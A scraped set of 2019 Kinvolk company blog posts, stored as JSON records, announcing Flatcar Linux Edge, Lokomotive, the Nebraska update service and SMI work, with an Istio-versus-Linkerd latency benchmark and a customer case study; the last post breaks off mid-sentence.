[
{"website": "Kinvolk", "title": "Introducing the Flatcar Linux Edge Channel", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/05/introducing-the-flatcar-linux-edge-channel/", "abstract": "Today, Kinvolk is making available a new channel to Flatcar Linux , Flatcar Linux Edge . This channel serves to deliver experimental Linux OS technologies to the Kubernetes developer community in an easily accessible manner. The goal is to accelerate the adoption of cutting-edge Linux technologies in Kubernetes and related projects. Background First announced just over a year ago, Flatcar Linux is Kinvolk’s drop in replacement for CoreOS’ Container Linux. There were two main reasons we decided to initiate the fork. Firstly, we believe the technology is sound and valuable. Secondly, we saw the potential for using Flatcar Linux as a means of driving innovative Linux technologies into Kubernetes and the wider cloud native ecosystem. With the Flatcar Linux Edge channel we are now executing on this second point by providing a channel that delivers cutting edge Linux technologies in an easily accessible manner. What is Flatcar Linux Edge? Flatcar Linux Edge is an experimental Linux distribution for containers delivered as an additional channel alongside the existing stable, beta, and alpha channels . While the existing channels are intended to serve as a delivery process for stable releases, the edge channel delivers experimental features not intended for production environments. Rather, the edge channel is intended to serve as a common platform for the cloud native and Kubernetes community to experiment with new Linux OS technologies. The Flatcar Linux Edge channel differs in several key aspects that set it apart from the existing channels. For example, the edge channel lives independent of the standard channel flow ; changes are not necessarily expected to flow into any of the other channels. features are not stable and may come and go . Only features with maintainers will be accepted and unmaintained features will be removed. These changes will be included in the release notes. is in no way supported . The other channels are part of Kinvolk’s Flatcar support coverage, the edge channel will not be. What’s in the initial channel release? The first release of the Flatcar Linux Edge channel includes the following collection of enhancements, including those needed to demonstrate upcoming BPF tools the Kinvolk team will be highlighting in follow-up posts. These initial features are… Wireguard a fast and modern in-kernel VPN technology cgroups v2 enabled by default on the system and in container workloads cri-o a container runtime built for Kubernetes some hardcoded OCI hooks to ease experimentation in Kubernetes additional tools installed on the host, available to aforementioned OCI hooks: bpftool , cgroupid Ideas for future inclusion In the future, we’d like to see support for restricted /proc (see our article on unprivileged container builds ), experimental kernel patches (especially for BPF), new container runtimes and features, Firecracker seccomp with external tracer (SECCOMP_RET_TRACE in Linux 4.8). These are just the things we at Kinvolk have thought of. We’re looking forward to seeing what kind of things the community would like to add. Why Flatcar Linux Edge? At Kinvolk we frequently work on cutting-edge Linux technologies that are not yet available in conventional Linux distributions. In doing so, we spend a good amount of time setting up and configuring systems; compiling kernels, patching software and configurations, etc. With edge we want others to benefit from this effort and also provide the community a platform to deliver and experiment with such technologies. We think Flatcar Linux Edge can be the platform for driving innovative features into Kubernetes and related tooling. Get involved! As an unstable, experimental channel, the barrier of getting a feature in is decidedly low. The only requirement is that you commit to maintaining that feature or see it removed in future releases. So if you have ideas, get in touch.", "date": "2019-05-15"},
{"website": "Kinvolk", "title": "Driving Kubernetes Forward with Lokomotive", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/05/driving-kubernetes-forward-with-lokomotive/", "abstract": "Over the past few years, Kinvolk has been fortunate to work with some of the leading names in the industry on some of the most interesting projects in the cloud-native space. This work has without exception relied on our team’s deep knowledge of Linux, containers, Kubernetes and how these all work together. Our team’s rare ability to affect every layer of the Kubernetes stack has provided technology-spanning benefits and the driving motivations for our next steps. With that background, today we are announcing Lokomotive , a full-stack Kubernetes distribution with three overarching goals: Be a secure, stable and dynamic Kubernetes distribution : First and foremost, Lokomotive is made to be production-ready, meaning it delivers on the fundamental qualities organizations require to entrust their business-critical workloads. Drive cutting-edge Linux technologies into Kubernetes : Lokomotive will be our engine to drive the cutting-edge technologies delivered by Flatcar Linux Edge into Kubernetes. Currently this includes Linux 5.1, cgroup v2, Wireguard, new BPF features, OCI hooks integration with BPF, and more. This will ensure that Lokomotive is positioned to be the first Kubernetes distribution to take advantage of such features. Deliver production-grade, completely open sourced product : Kinvolk was founded on our belief that open source is the best way to develop software and drive innovation. We have done that through our community contributions and commercial engineering services. We will continue to be true to our open source ethos as we offer commercial support for Lokomotive, Flatcar Linux and future products. What is Lokomotive? Lokomotive is a Kubernetes distribution inspired by CoreOS Tectonic and built to run atop Flatcar Linux . Like Tectonic, Lokomotive is a self-hosted Kubernetes, meaning the Kubernetes components run in containers managed by Kubernetes itself, taking advantage of Kubernetes’ built-in scaling and resiliency features. The main Lokomotive repository is a fork of former CoreOS engineer Dalton Hubble ’s Typhoon project. Through his efforts, Lokomotive starts with a stable foundation upon which we build. Platform support currently includes AWS, Azure, Baremetal, GCE and Packet. Others will be added over time. lokoctl The main entry point of Lokomotive is lokoctl , the Lokomotive installer. lokoctl packages the entire Lokomotive install experience into an easy to use binary. Configuration is done using HCL -based configuration files. lokoctl development is ongoing and it will be made available by the time full commercial support of Lokomotive is announced. Lokomotive Components Lokomotive aims to include the necessary components needed for production Kubernetes deployments. For this we have Lokomotive Components. Lokomotive Components provide all the cluster elements needed before applications are deployed: monitoring, ingress, logging, networking, storage, service mesh, authentication provider, etc. With this approach, we also ensure we deliver a secure configuration out-of-the-box, including secure default settings, authentication, and certificate management. Cluster settings and Components are configured via declarative HCL-based configuration files ensuring a consistent, fully automatable cluster creation process and the ability to treat individual clusters as disposable, easily replicated deployment artifacts. We’ll be revealing more details about Lokomotive at the same time that we announce full commercial support availability. What’s next for Lokomotive? Today we are opening up the first seeds of Lokomotive. A fully supported Lokomotive release with lokoctl and Lokomotive Components will be available this summer. These first seeds provide a solid base Kubernetes experience. But our main motivation at this point is to start pushing cutting-edge Linux technologies into Kubernetes, leveraging Flatcar Linux Edge. Thus, over the next few months, you can expect Lokomotive to be used to demonstrate some of the new ideas we’d like to see in Kubernetes. Client-driven development With production Lokomotive clusters serving hundreds of thousands of requests per second of business-critical traffic, we already know Lokomotive is a stable and reliable technology. We are now working with clients to improve the Lokomotive user experience in preparation for general availability. If you are looking to have a solid Kubernetes platform and work with experts to drive new technologies forward, please reach out at [email protected] or via IRC (Freenode #lokomotive-k8s). Resources Lokomotive Kubernetes repository Flatcar docs Flatcar Edge Typhoon", "date": "2019-05-17"},
{"website": "Kinvolk", "title": "Performance Benchmark Analysis of Istio and Linkerd", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Thilo Fromm\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/05/performance-benchmark-analysis-of-istio-and-linkerd/", "abstract": "Updated on 2019-05-29 with clarifications on Istio’s mixer configuration for the “tuned” benchmark, and adding a note regarding performance testing with the “stock” configuration we used. The Istio community has updated the description of the “evaluation configuration” based on the findings of this blog post. While we will not remove the original data from this blog post for transparency reasons, we will focus on data of the “tuned istio” benchmark for comparisons to linkerd. Motivation Over the past few years, the service mesh has rapidly risen to prominence in the Kubernetes ecosystem. While the value of the service mesh may be compelling, one of the fundamental questions any would-be adopter must ask is: what’s the cost ? Cost comes in many forms, not the least of which is the human cost of learning any new technology. In this report we restrict ourselves to something easier to quantify: the resource cost and performance impact of the service mesh at scale. To measure this, we ran our service mesh candidates through a series of intensive benchmarks. We consider Istio, a popular service mesh from Google and IBM, and Linkerd, a Cloud Native Computing Foundation (CNCF) project. Buoyant, the original creators of Linkerd, approached us to perform this benchmark and tasked us with creating an objective comparison of Istio and Linkerd. As this allowed us to dive more deeply into these service mesh technologies, we kindly accepted the challenge. It should be noted that Kinvolk currently has ongoing client work on Istio. Our mission is to improve open source technologies in the cloud native space and that is the spirit by which we present this comparison. We are releasing the automation for performing the below benchmarks to the Open Source community. Please find our tooling at https://github.com/kinvolk/service-mesh-benchmark . Goals We had three goals going into this study: Provide a reproducible benchmark framework that anyone else can download and use. Identify scenarios and metrics that best reflect the operational cost of running a service mesh. Evaluate popular service meshes on these metrics by following industry best practices for benchmarking, including controlling for sources of variability, handling coordinated omission, and more. Scenario We aim to understand mesh performance under regular operating conditions of a cluster under load. This means that cluster applications, while being stressed, are still capable of responding within a reasonable time frame. While the system is under (test) load the user experience when accessing web pages served by the cluster should not suffer beyond an acceptable degree. If, on the other hand, latencies would regularly be pushed into the seconds (or minutes) range, then a real-world cluster application would provide a bad user experience, and operators (or auto-scalers) would scale out. In the tests we ran, the benchmark load - in terms of HTTP requests per second - is set to a level that, while putting both application and service mesh under stress, also allows traffic to still be manageable for the overall system. Metrics rps, User Experience, and Coordinated Omission HTTP traffic at a constant rate of requests per second (rps) is the test stimulus, and we measure response latency to determine the overall performance of a service mesh. The same rps benchmark is also performed against a cluster without any service mesh (“bare”) to understand the performance baseline of the underlying cluster and its applications. Our benchmarks take Coordinated Omission into account, further contributing towards a UX centric approach with objective latency measurement. Coordinated Omission occurs when a load generator issues new requests only after previously issued requests have completed, instead of issuing a new request at the point in time where it would need to be issued to fulfill the requests per second rate requested from the load generator. As an example, if we would want to measure latency with a load of 10 requests per second, we’d need to send out a new request every 100 milliseconds, using a constant request rate of 10 Hz. But when a load generator waits for completion of a request that takes longer than 100ms, the rps rate will not be maintained - only 9 (or fewer) requests will be issued during that second instead of the requested 10. High latency is only attributed to a single request even though objectively, successive requests also experience elevated latency - not because these take long to complete, but because they are issued too late. There are two drawbacks with this behaviour: high latency will only be attributed to a single request, even though succeeding requests suffer elevated latency, too (as called out before - not because the results are late, but the requests are issued too late to begin with). And secondly, the application / service mesh under load is granted a small pause from ongoing load during the delayed response, as no new request is issued when it would need to be to match the requested rps. This is far from the reality of a “user stampede” where load quickly piles up in high latency situations. For our benchmarks, we use wrk2 to generate load and to measure round-trip latency from the request initiator side. wrk2 is a friendly fork, by Gil Tene, of the popular http benchmark tool wrk , by Will Glozer. wrk2 takes requested throughput as parameter, produces constant throughput load, eliminates Coordinated Omission by measuring latency from the point in time where a request should have been issued , and also makes an effort to “catch up” if it detects that it’s late, by temporarily issuing requests twice as fast as the original RPS rate. wrk2 furthermore contains Gil Tene’s “HDR Histogram” work, where samples are recorded without loss of precision. Longer test execution times contribute to higher precision, thus giving us more precise data particularly for the upper percentiles we are most interested in. For the purpose of this benchmark, we extended the capabilities of wrk2, adding the handling of multiple server addresses and multiple HTTP resource paths. We do not consider our work a fork and will work with upstream to get our changes merged. Performance For evaluating performance we look at latency distribution (histograms), specifically at tail latencies in the highest percentiles. This is to reflect this benchmark’s focus on user experience: a typical web page or web service will require more than one, possibly many, requests to perform a single user action. If one request is delayed, the whole action gets delayed. What’s p99 for individual requests thus becomes significantly more common in more complex operations, e.g. a browser accessing all the resources a web page is made of in order to render it - that’s why p99 and higher percentiles matter to us. Resource Consumption Nothing comes for free - using a service mesh will have a cluster consume more resources for its operation, taking resources away from business logic. In order to better understand this impact we measure both CPU load of, and memory consumed by the service mesh control plane, and the service mesh’s application proxy sidecars. CPU utilization and memory consumption are measured in short intervals on a per-container level during test runs, the maximum resource consumption of components during individual runs is selected, and the median over all test runs is calculated and presented as a result. We observed that memory consumption peaks at the end of a benchmark run. This is expected, since (as outlined above) wrk2 issues a constant throughput rate - load will pile up when latency increases over a certain threshold - so memory resources, once allocated, are unlikely to be freed until the benchmark is over. CPU utilization per time slice also stayed at high levels and never broke down during runs. Benchmark Set-up The Cluster We use automated provisioning for our test clusters for swift and easy cluster set-up and teardown, allowing for many test runs with enough statistical spread to produce robust data. For the benchmarks run during our service mesh performance evaluation, we used a cluster of 5 workers. Each worker node sports a 24 core / 48 thread AMD EPYC(r) CPU at 2.4GHz, and 64 GB of RAM. Our tooling allows for a configurable number of nodes, allowing for re-running these tests using different cluster configurations. Load is generated and latency is measured from within the cluster, to eliminate noise and data pollution from ingress gateways - we’d like to fully focus on service meshes between applications. We deploy our load generator as a pod in the cluster, and we reserve one cluster node for load generation / round-trip latency measurement, while using the remaining four nodes to run a configurable number of applications. In order to maintain sufficient statistical spread, we randomly pick the “load generator” node for each run. One random node is picked before each run and reserved exclusively for the load generator. The remaining nodes run the application under load. For the purpose of this test we used Packet as our IaaS provider; the respective server type used for worker nodes is c2.medium. Packet provides “bare metal” IaaS - full access to physical machines - allowing us to eliminate neighbour noise and other contention present in virtualized environments. Cluster Applications As discussed in the “Metrics” section above, we use wrk2 to generate load, and augment the tool to allow benchmarks against multiple HTTP endpoints at once. The application we use to run the benchmark against is “Emojivoto”, which comes as a demo app with Linkerd, but is not related to Linkerd functionality, or to service meshes in general (Emojivoto runs fine without a service mesh). Emojivoto uses a HTTP microservice by the name of web-svc (of kind: load-balancer ) as its front-end. web-svc communicates via gRPC with the emoji-svc and voting-svc back-ends, which provide emojis and handle votes, respectively. We picked Emojivoto because it is clear and simple in structure, yet contains all elements of a cloud-native application that are important to us for benchmarking service meshes. The emojivoto application consists of 3 microservices. However, benchmarking service meshes with only a single application would be a far cry from real-world use cases where service meshes matter - those are complex set-ups with many apps. In order to address this issue yet keep our set-up simple, we deploy the Emojivoto app a configurable number of times and append a sequence counter to service account and deployment names. As a result, we now have a test set-up that runs web-svc-1 , emoji-svc-1 , voting-svc-1 alongside web-svc-2 , emoji-svc-2 , voting-svc-2 , etc. Our load generator will spread its requests and access all of the apps' URLs, while observing a fixed overall rps rate. Looping over the deployment yaml and appending counters to app names allows us to deploy a configurable number of applications. On Running Tests and Statistical Robustness As we are using the datacenters of a public cloud provider - Packet - to run our benchmarks, we have no control over which specific servers are picked for individual deployments. The age of the machine and its respective components (memory, CPU, etc), its position in the datacenter relative to the other cluster nodes (same rack? same room? same fire zone?), and the state of the physical connections between the nodes all have an impact on the raw data any individual test run would produce. The activity of other servers unrelated to our test, but present in the same datacenter, and sharing the same physical network resources, might have a derogatory effect on test runs, leading to dirty benchmark data. We apply sufficient statistical spread with multiple samples per data point to eliminate volatile effects of outside operations on the same physical network when comparing data points relative to each other - i.e. Istio’s latency and resource usage to Linkerd’s. We furthermore use multiple clusters in different datacenter with implicitly different placement layouts to also help drawing absolute conclusions from our data. In order to achieve sufficient statistical spread we execute individual benchmark runs twice to derive average and standard deviation. We run tests in two clusters of identical set-up in parallel to make sure our capacity does not include a “lemon” server (degraded hardware) or a bad switch, or has nodes placed at remote corners in the datacenter. A typical benchmark test run would consist of the following steps. These steps are run on two clusters in parallel, to eliminate the impact of “lemon” servers and bad networking. => Before we start, we reboot all our worker nodes. => Then, for each of “istio-stock”, “istio-tuned”, “linkerd”, “bare”, do, on 2 clusters simultaneously: Install the service mesh (skip if benchmarking “bare”, i.e. w/o service mesh) Deploy emojivoto applications Deploy benchmark load generator job Wait for the job to finish, while pulling resource usage metrics every 30 secs Pull benchmark job logs which contain latency metrics Delete benchmark load generator job and emojivoto Uninstall service mesh Goto 1. to benchmark the next service mesh (linkerd -> istio -> bare) After all 4 benchmarks concluded, start again with the first service mesh, and run the above twice to gain statistical coverage Reproducibility We provisioned the clusters using Kinvolk’s recently announced Kubernetes distribution, Lokomotive. The code for automating both the provisioning of the test clusters as well as for running the benchmarks is available under an open source license in the Github repo. This is to allow for reproducing the benchmark results and hopefully accepting improvements from others. As mentioned above, we are also releasing our extensions to wrk2, available here: https://github.com/kinvolk/wrk2 . Benchmark runs and observations We benchmarked “bare” (no service mesh), “Istio-stock” (without tuning), “Istio-tuned”, and “Linkerd” with 500 requests per second, over 30 minutes. Benchmarks were executed twice successively per cluster, in 2 clusters - leading to 4 samples per data point. The test clusters were provisioned in separate data centers in different geographical regions - one in Packet’s Sunnyvale datacenter, and one in the Parsippany datacenter in the New York metropolitan area. Service mesh versions used Istio - “stock” and “tuned” We ran our benchmarks on Istio release 1.1.6 , which was current at the time we ran the benchmarks. We benchmarked both the “stock” version that users would receive when following the evaluation set-up instructions ( update : a warning has been added to the evaluation instructions following the initial release of this blog post; see details below) as well as a “tuned” version that removed memory limitations and disabled a number of Istio components, following various tuning recommendations. Specifically, we disabled Mixer’s Policy feature (while leaving telemetry active to retain feature parity with Linkerd), and disabled Tracing, Gateways, and the Prometheus add-on configuration. Update 2019-05-29 @mandarjog and @howardjohn reached out to us via a github issue filed to the service mesh benchmark project , raising that: The “stock” Istio configuration, while suitable for evaluation, is not optimized for performance testing. This led to a change on the Istio project website to call out this limitation explicitly. The “tuned” Istio configuration was still enforcing a restrictive CPU limit in one case. We removed the limitation and increased the limits in accordance with suggestions we received in the github issue. We re-ran a number of tests but did not observe significant changes from the results discussed below - the relations of bare, Linkerd, and Istio latency remained the same. Also, Istio continued to expose latencies in the minute range when being overloaded at 600rps. Please find the re-run results in the github issue at https://github.com/kinvolk/service-mesh-benchmark/issues/5#issuecomment-496482381 . Linkerd We used Linkerd’s Edge channel, and went with Linkerd2-edge-19.5.2 , which was the latest Linkerd release available at the time we ran the benchmarks. We used linkerd as-is, following the default set-up instructions , and did not perform any tuning. Gauging the limits of the meshes under test Before we started our long-running benchmarks at constant throughput and sufficient statistical spread, we gauged throughput and latency of the service meshes under test in much shorter runs. Our goal was to find the point of load where a mesh would still be able to handle traffic with acceptable performance, while under constant ongoing load. For our benchmark set-up with 30 Emojivoto applications / 90 microservices - averaging 7.5 apps, or 22 microservices, per application node - we ran a number of 10 minute benchmarks with varying RPS to find the sweet spot described above. Individual benchmark run-time Since we are most interested in the upper tail percentiles, the run-time of individual benchmark runs matters. The longer a test runs, the higher are the chances that increased latencies pile up in the 99.9999th and the 100th percentile. To both reflect a realistic “user stampede” as well as its mitigation by new compute resources coming live, we settled for a 30 minutes benchmark run-time. Please note that while we feel that new resources, particularly in auto-scaled environments, should be available much sooner than after 30 minutes, we also believe 30 minutes are a robust safety margin to cover unexpected events like provisioning issues while autoscaling. Benchmark #1 - 500RPS over 30 minutes This benchmark was run over 30 minutes, with a constant load of 500 requests per second. Latency percentiles Logarithmic Latency (in milliseconds) for 500 requests per second We observed a surprising variance in the bare metal benchmark run, leading to rather large error bars - something Packet may want to look into on the occasion. This has a strong effect on the 99.9th and the 99.999th percentile in particular - however, overall tendency is affirmed by the remaining latency data points. We see Linkerd leading the field, and not much of a difference between stock and tuned istio when compared to Linkerd. Let’s look at resource usage next. Memory usage and CPU utilization We measured memory allocation and CPU utilization at their highest point in 4 individual test runs, then used the median and highest/lowest values from those 4 samples for the above charts. The outlier sample for Linkerd’s control plane memory consumption was caused by a linkerd-prometheus container which consumed twice the amount of memory as the overall Linkerd control plane did on average. With Istio, we observed a number of control plane containers (pilot, and related proxies) disappear during the benchmark runs, in the middle of a run. We are not entirely certain on the reasons and did not do a deep dive, however, we did not include resource usage of the “disappearing containers” at all in our results. Benchmark #2 - 600RPS over 30 minutes This benchmark was run over 30 minutes, with a constant load of 600 requests per second. Latency percentiles Logarithmic Latency (in milliseconds) for 600 requests per second We again observe strong variations of bare metal network performance in Packet’s datacenters; however, those arguably are less impacting on the service mesh data points compared to the 500rps benchmark. We are approaching the upper limit of acceptable response times for linkerd, with the maximum latency measured at 3s in the 100th percentile. With this load, Istio easily generated latencies in the minutes range (please bear in mind that we use a logarithmic Y axis in the above chart). We also observed a high number of socket / HTTP errors - affecting 1% to 5.2% of requests issued, with the median at 3.6%. Also, we need to call out that the effective constant throughput rps rate Istio was able to manage at this load was between 565 and 571 rps, with the median at 568 rps . Istio did not perform 600rps in this benchmark. Update 2019-05-28: We would like to explicitly call out that Istio clusters would have scaled out long before reaching this point -therefore the minutes latency does not reflect real-world experiences of Istio users. At the same time, it is worth noting that, while Istio is overloaded, Linkerd continues to perform within a bearable latency range, without requiring additional instances or servers to be added to the cluster. Memory usage and CPU utilization While the above charts imply a bit of an unfair comparison - after all, we’re seeing Linkerd’s resource usage at 600rps, and Istio’s at 570rps - we still observe an intense hunger for resources on the Istio side. We again observed Istio containers disappearing mid-run, which we ignored for the above results. Conclusion Both Istio and Linkerd perform well, with acceptable overhead at regular operating conditions, when compared to bare metal. Linkerd takes the edge on resource consumption, and when pushed into high load situations, maintains acceptable response latency at a higher rate of requests per second that Istio is able to deliver. Future Work With our investment in automation to perform the above benchmarks, we feel that we created a good foundation to build on. Future work will focus on extending features and capabilities of the automation, both to improve existing tests and to increase coverage of test scenarios. Most notably, we feel that limiting the benchmark load generator to a single pod is the largest limitation of the above benchmark tooling. This limits the amount of traffic we can generate to the physical machine the benchmark tool runs on in a cluster. Overcoming this limitation would allow for more flexible test set-ups. However, running multiple pods in parallel poses a challenge when merging results, i.e. merging the “HDR Histogram” latency statistics of individual pods, without losing the precision we need to gain insight into the high tail percentiles.", "date": "2019-05-18"},
{"website": "Kinvolk", "title": "How the Service Mesh Interface (SMI) fits into the Kubernetes landscape", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kühl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/05/how-the-service-mesh-interface-smi-fits-into-the-kubernetes-landscape/", "abstract": "How the Service Mesh Interface (SMI) fits into the Kubernetes landscape Today, the Service Mesh Interface (SMI) was announced at Microsoft’s KubeCon keynote. The SMI aims to provide a consistent interface for multiple service meshes within Kubernetes. Kinvolk is proud to be one of the companies working on the effort. Specifically, we’ve worked to enable Istio integration with the SMI. A look at Kubernetes Interfaces Kubernetes has many interfaces, and for good reason. Interfaces allow for multiple underlying implementations of the technology they target. This allows vendors to create competing solutions on a level playing field and helps to guard users from being locked in to a particular solution. The result is increased competition and more rapid innovation; both a benefit to users. To give context, let’s look at a couple of the important interfaces used in Kubernetes. Container Network Interface One of the first interfaces that found its way into Kubernetes was the Container Network Interface (CNI), a technology originally found in the rkt project. Previous to the existence of this interface, you had to use Kubernetes’ limited, built-in networking. With the introduction of the CNI, which standardized the requirements for a networking plug-in around a very simple set of primitives, we witnessed an explosion in the number of networking solutions for Kubernetes, from container-centric open source projects such as flannel and Calico, to SDN infrastructure vendors like Cisco and VMware, to cloud-specific CNIs from AWS and Azure. CNI was also adopted by other orchestrators, such as Mesos and CloudFoundry, making it the de facto unifying standard for container networking. Container Runtime Interface The Container Runtime Interface (CRI) was introduced to enable the use of different container runtimes for Kubernetes. Previous to the introduction of the CRI, adding an additional container runtime required code changes throughout the Kubernetes code base. This was the case when rkt was introduced as an additional runtime. But it was obvious that this was not a maintainable solution as more container runtimes were introduced. We now have, with the CRI, many additional container runtimes to choose from: container-d, CRI-O, virtlet, and more. Container Storage Interface While relatively new, the Container Storage Interface (CSI) has achieved similar success. It defines a standard approach for exposing block and file storage systems to container orchestrators like Kubernetes. Unlike volume plug-ins, which were “in-tree”, meaning they had to be upstreamed into the main Kubernetes codebase, CSI drivers are external projects, enabling storage developers to develop and ship independently of Kubernetes releases. There are now more than 40 CSI drivers including for Ceph, Portworx, and all the major cloud providers. And Now: Service Mesh Interface (SMI) Service Meshes are becoming popular because they provide fine-grained control over microservice connectivity, enabling (for example) smooth transition from an older release of a service to a newer one (e.g. a blue/green or canary deployment model). Linkerd was probably the first such solution, but it has been followed by Istio and many others. With the growing proliferation of solutions, all deployed and managed in slightly different ways, it was clear that a similar standard interface for enabling service meshes – a Service Mesh Interface (SMI) – would bring value to the Kubernetes community, in much the same way that CRI, CNI and CSI did. Kinvolk was among group of development teams that contributed to this effort, along with the other participating companies . Specifically, we developed the plugin driver that enables Istio to be deployed via SMI. The Service Mesh Interface promises a common interface for various service meshes. This should make it easier for users to experiment with alternative service mesh solutions, to see which works best for their use cases. As we have found with our own recent testing , due to their differing implementations, each solution has its own unique performance and behavior characteristics. We are hopeful this will lead to greater user choice, and flourishing of new projects in the ecosystem just as happened with other areas where Kubernetes enabled open extensibility.", "date": "2019-05-21"},
{"website": "Kinvolk", "title": "How PubNative is Saving 30% on Infrastructure Costs with Kinvolk, Packet, and Kubernetes", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andrew Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/07/how-pubnative-is-saving-30-on-infrastructure-costs-with-kinvolk-packet-and-kubernetes/", "abstract": "Earlier this year, mobile advertising technology leader PubNative approached Kinvolk with an interesting challenge: rapid business growth meant their cloud bill was also growing rapidly. Leveraging Packet’s bare metal cloud locations around the globe, they believed they could benefit from significant cost savings and achieve greater flexibility with a multi-cloud architecture. Running Kubernetes in a bare metal environment was not the same as in AWS, though, and PubNative needed help. Kinvolk brought the technology, expertise and collaborative approach to enable them to successfully migrate their application from Amazon Web Services to Packet, resulting in cost savings of hundreds of thousands of dollars. Read our case study to find out more about PubNative’s business, the technical challenges, and final results of the project.", "date": "2019-07-16"},
{"website": "Kinvolk", "title": "Announcing the Kinvolk Update Service and Nebraska Project", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Joaquim Rocha\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/11/announcing-the-kinvolk-update-service-and-nebraska-project/", "abstract": "Today we are announcing the Kinvolk Flatcar Container Linux Subscription, which includes a new managed service, the Kinvolk Update Service. This is covered in more detail in another blog post . In this post, we’ll dive into the details of Kinvolk Update Service and share more about the heritage, functionality, and implementation. Of course, Kinvolk Update Service is built on 100% Open Source Software, which we are also making available today on github as the Nebraska project. Motivation When having a number of Flatcar Container Linux instances that compose a cluster, it is useful to have a tool to roll out updates, and to monitor the status of the instances and the updates progress. i.e. How many instances are currently downloading version X.Y.Z in our cluster? And how many should be updated to the new beta version? Heritage Flatcar Container Linux is based on CoreOS Container Linux, and there is an official update manager solution for CoreOS in form of a web application, called CoreUpdate. However, it is not Open Source and was only available with a paid CoreOS subscription. Luckily an Open Source alternative called CoreRoller existed. This project offered most of the functionality we desired for our Flatcar Linux subscription clients, but was inactive for a few years, which in Javascript years (used for its frontend) meant a large number of CVEs in the Node packages’ outdated versions, as well as other deprecated or inactive libraries used. While CoreRoller provided a good starting point, we wanted to build a more advanced solution for the Kinvolk Update Service. Specifically, we aimed to provide a more modern UI and other ways to visualize the updates and states of the cluster. Besides that, we also need to deploy this new service to clients and update it quickly in case of new security fixes or new features. So we concluded that the easiest way to do all this was to build our own version, but starting from and building on the great work done by the authors of CoreRoller. This new project is called Nebraska and is, of course, completely Open Source software. It powers the Kinvolk Update Service, which is a branded build of Nebraska, hosted and managed by Kinvolk for our subscription customers. There is no community vs corporate versions strategy here, so as with all Kinvolk software, customers can feel safe knowing there is no vendor lock-in strategy behind our offering of Kinvolk Update Service with their Flatcar Container Linux Subscriptions. Features So what can the Kinvolk Update Service do for you? What functionality does it have? Here is a summarized list of capabilities: Control of updates behavior / rate limiting Custom groups and channels Update progress overview Versions evolution timeline Detailed history per machine Authentication through Github Distribution of updates payload or redirection Automatic fetch of new packages’ metadata … (we’ll keep working on more!) How it’s built The Kinvolk Update Service, or Nebraska, is composed by a backend that is written in Golang, and a frontend in the form of a web-app, using React and Material UI. A typical overview of how it is deployed is illustrated in the following diagram: One thing that’s illustrated in the diagram but may not be obvious is that Nebraska is a passive service, in the sense that it is the instances that connect to it giving information about their status, and not Nebraska that connects to instances. So all the data maintained and displayed by Nebraska is about past events (that happened in the last 24 hours by default). Architecture In order to better understand the capabilities of the Kinvolk Update Service in what comes to representing one’s clusters, it’s important to look into its architecture. The first actor in this architecture is the Application, or App. It represents the entity for which we will monitor and manage the updates. An obvious and common example of an Application in this sense is Flatcar Container Linux, but the Kinvolk Update Service can actually support any other application that shares the protocol it uses for managing the updates. This protocol is called Omaha and was created by Google for managing the updates of apps like Chrome and Google Earth. Thus, any applications/services that use the Omaha protocol can be expected to work with the Update Service. An Application may have one or more groups. A Group is a very important part of the architecture, since it is where the policy for the actual updates is defined. i.e. what update is to be rolled out, when, to how many instances, at what times, etc. is all defined per Group. What a Group represents is entirely up to the user though. It may be one flavor of software (e.g. the Edge variant for Flatcar Linux), a geo-location of a cluster (e.g. Central European Cluster ), different deployment clusters (e.g. Test Cluster), etc. It is entirely up to the user to choose what Groups represent. Groups need to know which software and version to provide to their instances, and that’s provided by the next level in our architecture called Channels. However, Channels don’t hold the information about the package directly, but instead point to last level in the architecture: Packages. A common question at this point is usually: “Why is this level of indirection needed? Why can’t Groups just contain the software+version that compose the actual update, or point themselves to a Package object?” This can be better answered with an example: if we have several groups that need to point to the stable version of a software, then we just have to have a Channel representing that stable version and point the Groups to the Channel; then, when the stable version is bumped (i.e. the Channel starts pointing to a new Package) all the Groups automatically point to it, instead of having to edit every Group and make them point to the new Package. Finally here are two similar diagrams, one illustrating what was described above, and the other with an example: This setup should allow enough flexibility to represent any clusters. But let’s look at example use-cases to have a more practical idea of what this project allows. Use Cases Rate Limiting A company has only 1 cluster of Flatcar Linux machines. It wants the machines to be updated as the new stable version of Flatcar Linux becomes available, but only 10 machines per hour should be updated (so if a number of them fails, it is more noticeable). What can be done: Run Kinvolk Update Server with the syncer on, to get the stable channel updated automatically; Create a group for the cluster, pointing to the stable channel; Watch the success rate for updates as they happen. Two Different Purpose Clusters A team is responsible for 2 clusters: Production + Testing. They want the Testing cluster to have its machines updated to Flatcar Linux Stable version automatically and as soon as it becomes available. The Production cluster on the other hand needs to be running the stable version but updates should be started when QA gives the green light (after using the Testing cluster), and updates should be done safely (1 machine at a time, abort when there’s a failure). What can be done: Testing’s updates can be triggered automatically, for as many instances at a time and as soon as available to the new stable becomes available (which is automatically done when using the syncer option). Production’s updates can be triggered manually (i.e. its Group will have updates disabled by default), and have the Safe option turned on (1 instance updated at a time, abort on first failure). Different Geo-locations A global company has two clusters, one in San Francisco, California, one in Berlin, Germany. Their instances should be updated automatically, but only during the respective office hours. What can be done: Run Kinvolk Update Server with the syncer on, to get the desired channel updated automatically; Set up a group for each geo-location (they can be called US West Coast , and Central Europe for example); Set up the timezone/office hours for each group and enable updates Future There are certainly improvements we can do to the Kinvolk Update Service / Nebraska, and Kinvolk will keep investing in that. Some ideas we aim to implement in the future are: CLI for managing and testing; More ways to visualize the gathered information (new charts, tables, etc.) ; Custom timeline filtering; Performance improvements; UX improvements. Finally, and as previously mentioned, Nebraska is 100% Open Source and we welcome contributions. If you have a bug fix you want to add, or a feature you want to implement, it is 